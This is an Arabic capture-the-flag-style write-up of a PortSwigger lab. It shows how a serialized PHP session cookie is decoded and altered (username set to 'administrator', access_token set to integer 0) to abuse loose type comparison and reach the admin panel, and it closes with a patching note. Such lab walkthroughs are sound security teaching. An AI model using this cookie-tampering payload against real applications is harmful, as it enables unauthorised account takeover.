# [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

## **`الهدف`**
قم بتعديل الكائن المسلسل في `session cookie` للوصول إلى حساب `administrator` ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0aa8001d037ad6f38059a393007b0090.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlbzB3MGc5YzJqNGo2YnVlcHUxYzFhOTNyd2J4MjM0ZCI7fQ%3d%3d
```
وعند تظليل الـ `Cookie` وفحصها داخل `Inspector` بعد فك ترميز `URL` ثم ترميز `Base64` عنها سنجد أنها كالتالي:
```PHP
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"eo0w0g9c2j4j6buepu1c1a93rwbx234d";}
```
لذلك سنقوم بتعديلها من داخل `Inspector` لتصبح كالتالي:
```PHP
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

ثم سنقوم بنسخ الـ `Cookie` الجديد ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لنجد أنه أصبح لدينا وصول لحساب `administrator`.

وبعد ذلك نتوجه إلى `Admin panel` ثم نقوم بحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Modifying serialized objects](./Modifying-serialized-objects.md)

ويجب تحديث إصدار `PHP` إلى إصدار `8` على الأقل لأنه بداية من هذا الإصدار تؤول المقارنة `0 == "Example string"` إلى `"خطأ false"`.
